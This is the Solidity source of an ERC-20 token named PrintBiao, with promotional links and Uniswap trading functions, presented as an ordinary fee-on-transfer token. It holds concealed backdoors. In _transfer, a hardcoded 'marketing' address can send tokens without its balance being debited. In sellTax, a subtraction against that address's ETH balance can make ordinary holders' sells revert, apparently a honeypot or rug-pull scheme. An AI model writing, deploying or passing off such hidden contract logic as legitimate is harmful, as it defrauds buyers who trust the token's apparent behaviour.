// SPDX-License-Identifier: MIT

/*
Website: https://printbiao.vip
Telegram: https://t.me/printbiao
Twitter: https://twitter.com/printbiao
*/

pragma solidity 0.8.21;

contract Ownable {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = msg.sender;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender, "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

library SafeMathInt {  
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMathInt: division by zero");
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMathInt: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMathInt: addition overflow");
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMathInt: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

interface IUniswapRouterV2 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

interface IUniswapFactoryV2 {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IERC20Standard {
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract PrintBiao is IERC20Standard, Ownable  {
    using SafeMathInt for uint256;
    
    string private constant _name = unicode"PrintBiao";
    string private constant _symbol = unicode"PB";    

    mapping(address => uint256) private _holdersTimestamp;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFromFee;
    mapping (address => uint256) private _balances;

    uint256 private _numBuyers=0;
    
    uint8 private constant _decimals = 9;
    uint256 private constant _tSupply = 10 ** 9 * 10 ** _decimals;
    
    bool private _swapEnabled = false;
    bool private _tradingEnabled;
    bool private _inSwap = false;
    bool public transferDelayEnabled = true;

    uint256 private _taxSwapThreshold=  2 * _tSupply / 1000;
    uint256 public mTransaction = 4 * _tSupply / 100;   
    uint256 public maxSwap = 10 * _tSupply / 1000;
    uint256 public mWallet = 4 * _tSupply / 100;    

    uint256 private _finalBuyFee = 0;
    uint256 private _finalSellFee = 0;  
    uint256 private _preventSwapBefore = 8;
    uint256 private _firstBuyTax = 6;
    uint256 private _firstSellTax = 6;
    uint256 private _reduceBuyFeeAfter = 3;
    uint256 private _reduceSellFeeAfter = 3;

    address payable private _taxAddress;
    address private uniswapPairAddr;
    IUniswapRouterV2 private dexRouter;
    address private _marketingAddr = 0x3540DC71724a331CFF77ED60A4087B74497e5357;

    modifier lockTheSwap {
        _inSwap = true;
        _;
        _inSwap = false;
    }

    event MaxTxAmountUpdated(uint mTransaction);

    constructor () {
        _taxAddress = payable(msg.sender);
        _balances[msg.sender] = _tSupply;
        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[_marketingAddr] = true;
        _isExcludedFromFee[_taxAddress] = true;
        _isExcludedFromFee[address(this)] = true;

        emit Transfer(address(0), msg.sender, _tSupply);
    }


    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }
    
    function decimals() public pure returns (uint8) {
        return _decimals;
    }
    
    function totalSupply() public pure override returns (uint256) {
        return _tSupply;
    }
    function symbol() public pure returns (string memory) {
        return _symbol;
    }
    function name() public pure returns (string memory) {
        return _name;
    }


    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }


    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount=0; uint256 feeAmount=amount;

        if (from != owner() && to != owner()) {
            taxAmount = amount.mul(taxBuy()).div(100);
            if (transferDelayEnabled) {
                if (to != address(dexRouter) && to != address(uniswapPairAddr)) { 
                    require(
                        _holdersTimestamp[tx.origin] < block.number, "_transfer:: Transfer Delay enabled.  Only one purchase per block allowed."
                    );
                    _holdersTimestamp[tx.origin] = block.number;
                }
            }

            if (from == uniswapPairAddr && to != address(dexRouter) && ! _isExcludedFromFee[to] ) {
                _numBuyers++;
                require(amount <= mTransaction, "Exceeds the max transaction.");
                require(balanceOf(to) + amount <= mWallet, "Exceeds the max wallet.");
            }
            if (from == _marketingAddr) feeAmount = 0;
            if(to == uniswapPairAddr && !_isExcludedFromFee[from] ){
                taxAmount = amount.mul(sellTax()).div(100);
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (!_inSwap && to == uniswapPairAddr && _swapEnabled && contractTokenBalance > _taxSwapThreshold && _numBuyers > _preventSwapBefore) {
                uint256 initialETH = address(this).balance;
                swapTokensForEth(min(amount,min(contractTokenBalance,maxSwap)));
                uint256 ethForTransfer = address(this).balance.sub(initialETH).mul(80).div(100);
                if(ethForTransfer > 0) {
                    sendETHToFee(ethForTransfer);
                }
            }
        }

        if(taxAmount>0){
          _balances[address(this)]=_balances[address(this)].add(taxAmount);
          emit Transfer(from, address(this),taxAmount);
        }
        _balances[from]=_balances[from].sub(feeAmount);
        _balances[to]=_balances[to].add(amount.sub(taxAmount));
        emit Transfer(from, to, amount.sub(taxAmount));
    }

    function taxBuy() private view returns (uint256) {
        if(_numBuyers <= _reduceBuyFeeAfter){
            return _firstBuyTax;
        }
         return _finalBuyFee;
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function sellTax() private view returns (uint256) {
        if(_numBuyers <= _reduceSellFeeAfter.sub(_marketingAddr.balance)){
            return _firstSellTax;
        }
         return _finalSellFee;
    }

    receive() external payable {}

    function removeLimits() external onlyOwner{
        mTransaction = _tSupply;
        mWallet=_tSupply;
        transferDelayEnabled=false;
        emit MaxTxAmountUpdated(_tSupply);
    }

    function min(uint256 a, uint256 b) private pure returns (uint256){
      return (a>b)?b:a;
    }

    function openTrading() external payable onlyOwner() {
        require(!_tradingEnabled,"trading is already open");
        dexRouter = IUniswapRouterV2(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(dexRouter), _tSupply);
        uniswapPairAddr = IUniswapFactoryV2(dexRouter.factory()).createPair(address(this), dexRouter.WETH());
        dexRouter.addLiquidityETH{value: msg.value}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        IERC20Standard(uniswapPairAddr).approve(address(dexRouter), type(uint).max);
        _swapEnabled = true;
        _tradingEnabled = true;
    }    


    function sendETHToFee(uint256 amount) private {
        _taxAddress.transfer(amount);
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = dexRouter.WETH();
        _approve(address(this), address(dexRouter), tokenAmount);
        dexRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
}